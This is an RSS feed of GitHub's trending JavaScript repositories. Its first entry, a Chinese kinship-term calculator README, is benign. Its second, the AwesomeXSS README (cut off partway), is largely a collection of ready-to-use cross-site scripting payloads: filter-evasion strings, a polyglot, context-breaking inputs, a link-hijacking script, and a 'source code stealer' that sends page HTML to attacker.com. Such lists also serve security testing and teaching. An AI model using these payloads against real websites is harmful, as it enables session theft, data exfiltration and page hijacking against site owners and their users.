<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub JavaScript Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-01-15T01:37:53Z</updated>
  <subtitle>Daily Trending of JavaScript in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>mumuy/relationship</title>
    <updated>2023-01-15T01:37:53Z</updated>
    <id>tag:github.com,2023-01-15:/mumuy/relationship</id>
    <link href="https://github.com/mumuy/relationship" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Chinese kinship system.中国亲戚关系计算器 - 家庭称谓/亲戚称呼/称呼计算/辈分计算/亲戚关系算法/親戚稱呼計算機&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://travis-ci.org/mumuy/relationship/&#34;&gt;&lt;img src=&#34;https://travis-ci.org/mumuy/relationship.svg?branch=gh-pages&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;由于工作生活节奏不同，如今很多关系稍疏远的亲戚之间来往并不多。因此放假回家过年时，往往会搞不清楚哪位亲戚应该喊什么称呼，很是尴尬。然而搞不清亲戚关系和亲戚称谓的不仅是小孩，就连年轻一代的大人也都常常模糊混乱。&lt;/p&gt; &#xA;&lt;p&gt;“中国家庭称谓计算器”为你避免了这种尴尬，只需简单的输入即可算出称谓。输入框兼容了不同的叫法，你可以称呼父亲为：“老爸”、“爹地”、“老爷子”等等，方便不同地域的习惯叫法。快捷输入按键，只需简单的点击即可完成关系输入，算法还支持逆向查找称呼哦～！&lt;/p&gt; &#xA;&lt;p&gt;项目演示地址：&lt;a href=&#34;https://passer-by.com/relationship/&#34;&gt;https://passer-by.com/relationship/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;移动版演示地址: &lt;a href=&#34;https://passer-by.com/relationship/vue/&#34;&gt;https://passer-by.com/relationship/vue/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;一、下载 &amp;amp; 安装&lt;/h2&gt; &#xA;&lt;p&gt;该 Javascript 库 / 模块可以用于前端也可以用于后端 Nodejs 中。&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;直接下载dist/relationship.min.js，然后使用 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签引入，可以得到全局的方法 &lt;code&gt;relationship&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;使用 npm 进行包管理，具体为：&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;&lt;strong&gt;npm install relationship.js&lt;/strong&gt;&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;然后使用 &lt;code&gt;require&lt;/code&gt; 引入模块&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var relationship = require(&#34;relationship.js&#34;);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;二、使用&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;通用方法: 唯一的计算方法 &lt;code&gt;relationship&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;选项模式&lt;code&gt;relationship(options)&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;参数&lt;code&gt;options&lt;/code&gt;结构为：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var options = {&#xA;&#x9;text:&#39;&#39;,&#x9;&#x9;// 目标对象：目标对象的称谓汉字表达，称谓间用‘的’字分隔&#xA;&#x9;target:&#39;&#39;,&#x9;    &#x9;// 相对对象：相对对象的称谓汉字表达，称谓间用‘的’字分隔，空表示自己&#xA;&#x9;sex:-1,&#x9;&#x9;&#x9;// 本人性别：0表示女性,1表示男性&#xA;&#x9;type:&#39;default&#39;,&#x9;&#x9;// 转换类型：&#39;default&#39;计算称谓,&#39;chain&#39;计算关系链,&#39;pair&#39;计算关系合称&#xA;&#x9;reverse:false,&#x9;&#x9;// 称呼方式：true对方称呼我,false我称呼对方&#xA;&#x9;mode:&#39;default&#39;,&#x9;&#x9;// 模式选择：使用setMode方法定制不同地区模式，在此选择自定义模式&#xA;&#x9;optimal:false,       &#x9;// 最短关系：计算两者之间的最短关系&#xA;};&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;代码示例：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 如：我应该叫外婆的哥哥什么？&#xA;relationship({text:&#39;妈妈的妈妈的哥哥&#39;});&#xA;// =&amp;gt; [&#39;舅外公&#39;]&#xA;&#xA;// 如：七舅姥爷应该叫我什么？&#xA;relationship({text:&#39;七舅姥爷&#39;,reverse:true,sex:1});&#xA;// =&amp;gt; [&#39;甥外孙&#39;]&#xA;&#xA;// 如：舅公是什么亲戚&#xA;relationship({text:&#39;舅公&#39;,type:&#39;chain&#39;});&#xA;// =&amp;gt; [&#39;爸爸的妈妈的兄弟&#39;, &#39;妈妈的妈妈的兄弟&#39;, &#39;老公的妈妈的兄弟&#39;]&#xA;&#xA;// 如：舅妈如何称呼外婆？&#xA;relationship({text:&#39;外婆&#39;,target:&#39;舅妈&#39;,sex:1});&#xA;// =&amp;gt; [&#39;婆婆&#39;]&#xA;&#xA;// 如：外婆和奶奶之间是什么关系？&#xA;relationship({text:&#39;外婆&#39;,target:&#39;奶奶&#39;,type:&#39;pair&#39;});&#xA;// =&amp;gt; [&#39;儿女亲家&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;语句模式&lt;code&gt;relationship(exptession)&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;参数&lt;code&gt;exptession&lt;/code&gt;句式可以为：&lt;code&gt;xxx是xxx的什么人&lt;/code&gt;、&lt;code&gt;xxx叫xxx什么&lt;/code&gt;、&lt;code&gt;xxx如何称呼xxx&lt;/code&gt;等.&lt;/p&gt; &#xA;&lt;p&gt;代码示例：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 如：舅妈如何称呼外婆？&#xA;relationship(&#39;舅妈如何称呼外婆？&#39;);&#xA;// =&amp;gt; [&#39;婆婆&#39;]&#xA;&#xA;// 如：外婆和奶奶之间是什么关系？&#xA;relationship(&#39;外婆和奶奶之间是什么关系？&#39;);&#xA;// =&amp;gt; [&#39;儿女亲家&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;内部属性：获取当前数据表 &lt;code&gt;relationship.data&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;内部属性：获取当前数据量 &lt;code&gt;relationship.dataCount&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;内部方法：用户自定义模式 &lt;code&gt;relationship.setMode(mode_name,mode_data)&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;代码示例(可参考数据表格式对数据进行覆盖)：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 关系解析语法&#xA;// 【关系链】f:父,m:母,h:夫,w:妻,s:子,d:女,xb:兄弟,ob:兄,lb:弟,xs:姐妹,os:姐,ls:妹&#xA;// 【修饰符】 1:男性,0:女性,&amp;amp;o:年长,&amp;amp;l:年幼,#:隔断,[a|b]:并列&#xA;relationship.setMode(&#39;northern&#39;,{&#xA;&#x9;&#39;m,f&#39;:[&#39;姥爷&#39;],&#xA;&#x9;&#39;m,m&#39;:[&#39;姥姥&#39;],&#xA;&#x9;&#39;m,xb,s&amp;amp;o&#39;:[&#39;表哥&#39;],&#xA;&#x9;&#39;m,xb,s&amp;amp;l&#39;:[&#39;表弟&#39;],&#xA;});&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;三、开发 &amp;amp; 贡献&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# 安装开发依赖&#xA;npm install&#xA;&#xA;# build 模块: 将 relationship 打包压缩&#xA;npm run build&#xA;&#xA;# 执行测试用例（可以在tests/test.js中完善测试用例）&#xA;npm test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;四、关于分歧&lt;/h2&gt; &#xA;&lt;p&gt;一些称呼存在南北方或地区差异，容易引起歧义，并不保证和你所处地区的称谓习惯一致。&lt;/p&gt; &#xA;&lt;p&gt;部分称呼有多种关系且跨辈分。例如：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;大爷：爷爷的哥哥 / 父亲的哥哥(北方)；&lt;/li&gt; &#xA; &lt;li&gt;舅公：爸妈的舅舅 / 老公的舅舅；&lt;/li&gt; &#xA; &lt;li&gt;伯公：爸妈的伯父 / 老公的伯父；&lt;/li&gt; &#xA; &lt;li&gt;叔公：爸妈的叔叔 / 老公的叔叔；&lt;/li&gt; &#xA; &lt;li&gt;姨公：爸妈的姨丈 / 老公的姨丈；&lt;/li&gt; &#xA; &lt;li&gt;姨夫：姨妈的老公 / 姨子的老公；&lt;/li&gt; &#xA; &lt;li&gt;姑夫：姑妈的老公 / 姑子的老公；&lt;/li&gt; &#xA; &lt;li&gt;婶子：叔叔的老婆 / 叔子的老婆；&lt;/li&gt; &#xA; &lt;li&gt;妗子：舅舅的老婆 / 舅子的老婆；&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;部分称呼以现代生活常见理解为主。例如：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;媳妇：在古代或者北方地区指儿子的妻子，这里指自己的妻子(儿媳妇写作“息妇”)；&lt;/li&gt; &#xA; &lt;li&gt;太太：一些地方指年长的妇人或曾祖父母，这里指自己的妻子；&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;五、教程&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mumuy/relationship/wiki/%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0&#34;&gt;算法实现原理&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;六、其他&lt;/h2&gt; &#xA;&lt;p&gt;他们都在用：&lt;/p&gt; &#xA;&lt;p&gt;查询网 &lt;a href=&#34;http://www.ip138.com/chengwei/&#34;&gt;http://www.ip138.com/chengwei/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;在线查询网 &lt;a href=&#34;http://qinshu.supfree.net/&#34;&gt;http://qinshu.supfree.net/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;在线工具 &lt;a href=&#34;http://www.atool.org/relateship.php&#34;&gt;http://www.atool.org/relateship.php&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;有道语文达人 &lt;a href=&#34;http://dict.youdao.com/k12yuwen/html/relation.html&#34;&gt;http://dict.youdao.com/k12yuwen/html/relation.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;小米MIUI系统计算器 &lt;a href=&#34;http://www.miui.com/&#34;&gt;http://www.miui.com/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;小米MIUI网页版本 &lt;a href=&#34;http://www.miui.com/zt/calculator2016/dist.php&#34;&gt;http://www.miui.com/zt/calculator2016/dist.php&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;符号库 &lt;a href=&#34;http://www.fuhaoku.com/tool/qinqiguanxi.html&#34;&gt;http://www.fuhaoku.com/tool/qinqiguanxi.html&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>s0md3v/AwesomeXSS</title>
    <updated>2023-01-15T01:37:53Z</updated>
    <id>tag:github.com,2023-01-15:/s0md3v/AwesomeXSS</id>
    <link href="https://github.com/s0md3v/AwesomeXSS" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Awesome XSS stuff&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;AwesomeXSS&lt;/h1&gt; &#xA;&lt;p&gt;This repository is a collection of Awesome XSS resources. Contributions are welcome and should be submitted via an issue.&lt;/p&gt; &#xA;&lt;h3&gt;Awesome contents&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-challenges&#34;&gt;Challenges&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-reads--presentations&#34;&gt;Reads &amp;amp; Presentations&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-tools&#34;&gt;Tools&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-xss-mind-maps&#34;&gt;Mind maps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-dom-xss&#34;&gt;DOM XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-payloads&#34;&gt;Payloads&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-polyglots&#34;&gt;Polyglots&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-tags--event-handlers&#34;&gt;Tags and event handlers&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-context-breaking&#34;&gt;Context breaking&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#html-context&#34;&gt;HTML context&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#attribute-context&#34;&gt;Attribute context&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#javascript-context&#34;&gt;JavaScript context&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-confirm-variants&#34;&gt;Confirm Variants&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-exploits&#34;&gt;Exploits&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-probing&#34;&gt;Probing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-bypassing&#34;&gt;Bypassing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-encoding&#34;&gt;Encoding&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS#awesome-tips--tricks&#34;&gt;Tips &amp;amp; tricks&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Awesome Challenges&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://prompt.ml&#34;&gt;prompt.ml&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://alf.nu/alert1&#34;&gt;alf.nu/alert1&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.s-p-o-o-k-y.com&#34;&gt;s-p-o-o-k-y.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://xss-game.appspot.com&#34;&gt;xss-game.appspot.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://polyglot.innerht.ml&#34;&gt;polyglot.innerht.ml&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://sudo.co.il/xss&#34;&gt;sudo.co.il/xss&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hack.me/t/XSS&#34;&gt;hack.me/t/XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.root-me.org/?page=recherche&amp;amp;lang=en&amp;amp;recherche=xss&#34;&gt;root-me.org&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://chefsecure.com/courses/xss/challenges&#34;&gt;chefsecure.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.wechall.net/challs/XSS&#34;&gt;wechall.net&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://codelatte.net/xss/&#34;&gt;codelatte.net/xss&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Awesome Reads &amp;amp; Presentations&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms&#34;&gt;Bypassing XSS Detection Mechanisms&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.shawarkhan.com/2017/08/sarahah-xss-exploitation-tool.html&#34;&gt;XSS in Sarahah&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://whitton.io/articles/xss-on-facebook-via-png-content-types/&#34;&gt;XSS in Facebook via PNG Content Type&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=fWk_rMQiDGc&#34;&gt;How I met your girlfriend&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=9ADubsByGos&#34;&gt;How to Find 1,352 Wordpress XSS Plugin Vulnerabilities in one hour&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=OT0fJEtz7aE&#34;&gt;Blind XSS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.slideshare.net/x00mario/copypest&#34;&gt;Copy Pest&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Awesome Tools&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/UltimateHackers/XSStrike&#34;&gt;XSStrike&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://xsshunter.com&#34;&gt;xsshunter.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/beefproject/beef&#34;&gt;BeEF&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/UltimateHackers/JShell&#34;&gt;JShell&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Awesome XSS Mind Maps&lt;/h3&gt; &#xA;&lt;p&gt;A beautiful XSS mind map by Jack Masa, &lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS/raw/master/Database/jackmasa-mind-map.png&#34;&gt;here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Awesome DOM XSS&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Does your input go into a sink? &lt;code&gt;Vulnerable&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;It doesn&#39;t? &lt;code&gt;Not vulnerable&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Source&lt;/strong&gt;: An input that could be controlled by an external (untrusted) source.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;document.URL&#xA;document.documentURI&#xA;document.URLUnencoded (IE 5.5 or later Only)&#xA;document.baseURI&#xA;location&#xA;location.href&#xA;location.search&#xA;location.hash&#xA;location.pathname&#xA;document.cookie&#xA;document.referrer&#xA;window.name&#xA;history.pushState()&#xA;history.replaceState()&#xA;localStorage&#xA;sessionStorage&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Sink&lt;/strong&gt;: A potentially dangerous method that could lead to a vulnerability. In this case a DOM Based XSS.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;eval&#xA;Function&#xA;setTimeout&#xA;setInterval&#xA;setImmediate&#xA;execScript&#xA;crypto.generateCRMFRequest&#xA;ScriptElement.src&#xA;ScriptElement.text&#xA;ScriptElement.textContent&#xA;ScriptElement.innerText&#xA;anyTag.onEventName&#xA;document.write&#xA;document.writeln&#xA;anyElement.innerHTML&#xA;Range.createContextualFragment&#xA;window.location&#xA;document.location&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This comprehensive list of sinks and source is taken from &lt;a href=&#34;https://github.com/wisec/domxsswiki&#34;&gt;domxsswiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Awesome Payloads&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;A/hREf=&#34;j%0aavas%09cript%0a:%09con%0afirm%0d``&#34;&amp;gt;z&#xA;&amp;lt;d3&#34;&amp;lt;&#34;/onclick=&#34;1&amp;gt;[confirm``]&#34;&amp;lt;&#34;&amp;gt;z&#xA;&amp;lt;d3/onmouseenter=[2].find(confirm)&amp;gt;z&#xA;&amp;lt;details open ontoggle=confirm()&amp;gt;&#xA;&amp;lt;script y=&#34;&amp;gt;&amp;lt;&#34;&amp;gt;/*&amp;lt;script* */prompt()&amp;lt;/script&#xA;&amp;lt;w=&#34;/x=&#34;y&amp;gt;&#34;/ondblclick=`&amp;lt;`[confir\u006d``]&amp;gt;z&#xA;&amp;lt;a href=&#34;javascript%26colon;alert(1)&#34;&amp;gt;click&#xA;&amp;lt;a href=javas&amp;amp;#99;ript:alert(1)&amp;gt;click&#xA;&amp;lt;script/&#34;&amp;lt;a&#34;/src=data:=&#34;.&amp;lt;a,[8].some(confirm)&amp;gt;&#xA;&amp;lt;svg/x=&#34;&amp;gt;&#34;/onload=confirm()//&#xA;&amp;lt;--`&amp;lt;img/src=` onerror=confirm``&amp;gt; --!&amp;gt;&#xA;&amp;lt;svg%0Aonload=%09((pro\u006dpt))()//&#xA;&amp;lt;sCript x&amp;gt;(((confirm)))``&amp;lt;/scRipt x&amp;gt;&#xA;&amp;lt;svg &amp;lt;/onload =&#34;1&amp;gt; (_=prompt,_(1)) &#34;&#34;&amp;gt;&#xA;&amp;lt;!--&amp;gt;&amp;lt;script src=//14.rs&amp;gt;&#xA;&amp;lt;embed src=//14.rs&amp;gt;&#xA;&amp;lt;script x=&#34;&amp;gt;&#34; src=//15.rs&amp;gt;&amp;lt;/script&amp;gt;&#xA;&amp;lt;!&#39;/*&#34;/*/&#39;/*/&#34;/*--&amp;gt;&amp;lt;/Script&amp;gt;&amp;lt;Image SrcSet=K */; OnError=confirm`1` //&amp;gt;&#xA;&amp;lt;iframe/src \/\/onload = prompt(1)&#xA;&amp;lt;x oncut=alert()&amp;gt;x&#xA;&amp;lt;svg onload=write()&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Awesome Polyglots&lt;/h3&gt; &#xA;&lt;p&gt;Here&#39;s an XSS polyglot that I made which can break out of 20+ contexts:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;%0ajavascript:`/*\&#34;/*--&amp;gt;&amp;amp;lt;svg onload=&#39;/*&amp;lt;/template&amp;gt;&amp;lt;/noembed&amp;gt;&amp;lt;/noscript&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/title&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;html onmouseover=&#34;/**/ alert()//&#39;&#34;&amp;gt;`&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Explanation of how it works, &lt;a href=&#34;https://github.com/s0md3v/AwesomeXSS/raw/master/Database/polyglot.png&#34;&gt;here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Awesome Tags &amp;amp; Event Handlers&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/UltimateHackers/AwesomeXSS/raw/master/Database/event-handlers.md&#34;&gt;105 Event Handlers with description&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://pastebin.com/raw/WwcBmz5J&#34;&gt;200 Event Handlers without description&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Some less detected event handlers&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;ontoggle&#xA;onauxclick&#xA;ondblclick&#xA;oncontextmenu&#xA;onmouseleave&#xA;ontouchcancel&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Some HTML Tags that you will be using&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;img&#xA;svg&#xA;body&#xA;html&#xA;embed&#xA;script&#xA;object&#xA;details&#xA;isindex&#xA;iframe&#xA;audio&#xA;video&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Awesome Context Breaking&lt;/h3&gt; &#xA;&lt;h4&gt;HTML Context&lt;/h4&gt; &#xA;&lt;p&gt;Case: &lt;code&gt;&amp;lt;tag&amp;gt;You searched for $input. &amp;lt;/tag&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;svg onload=alert()&amp;gt;&#xA;&amp;lt;/tag&amp;gt;&amp;lt;svg onload=alert()&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Attribute Context&lt;/h4&gt; &#xA;&lt;p&gt;Case: &lt;code&gt;&amp;lt;tag attribute=&#34;$input&#34;&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&#34;&amp;gt;&amp;lt;svg onload=alert()&amp;gt;&#xA;&#34;&amp;gt;&amp;lt;svg onload=alert()&amp;gt;&amp;lt;b attr=&#34;&#xA;&#34; onmouseover=alert() &#34;&#xA;&#34;onmouseover=alert()//&#xA;&#34;autofocus/onfocus=&#34;alert()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;JavaScript Context&lt;/h4&gt; &#xA;&lt;p&gt;Case: &lt;code&gt;&amp;lt;script&amp;gt; var new something = &#39;$input&#39;; &amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&#39;-alert()-&#39;&#xA;&#39;-alert()//&#39;&#xA;&#39;}alert(1);{&#39;&#xA;&#39;}%0Aalert(1);%0A{&#39;&#xA;&amp;lt;/script&amp;gt;&amp;lt;svg onload=alert()&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Awesome Confirm Variants&lt;/h3&gt; &#xA;&lt;p&gt;Yep, confirm because alert is too mainstream.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;confirm()&#xA;confirm``&#xA;(confirm``)&#xA;{confirm``}&#xA;[confirm``]&#xA;(((confirm)))``&#xA;co\u006efirm()&#xA;new class extends confirm``{}&#xA;[8].find(confirm)&#xA;[8].map(confirm)&#xA;[8].some(confirm)&#xA;[8].every(confirm)&#xA;[8].filter(confirm)&#xA;[8].findIndex(confirm)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Awesome Exploits&lt;/h3&gt; &#xA;&lt;h5&gt;Replace all links&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;Array.from(document.getElementsByTagName(&#34;a&#34;)).forEach(function(i) {&#xA;  i.href = &#34;https://attacker.com&#34;;&#xA;});&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Source Code Stealer&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;svg/onload=&#34;(new Image()).src=&#39;//attacker.com/&#39;%2Bdocument.documentElement.innerHTML&#34;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A good compilation of advanced XSS exploits can be found &lt;a href=&#34;http://www.xss-payloads.com/payloads-list.html?a#category=all&#34;&gt;here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Awesome Probing&lt;/h3&gt; &#xA;&lt;p&gt;If nothing of this works, take a look at &lt;strong&gt;Awesome Bypassing&lt;/strong&gt; 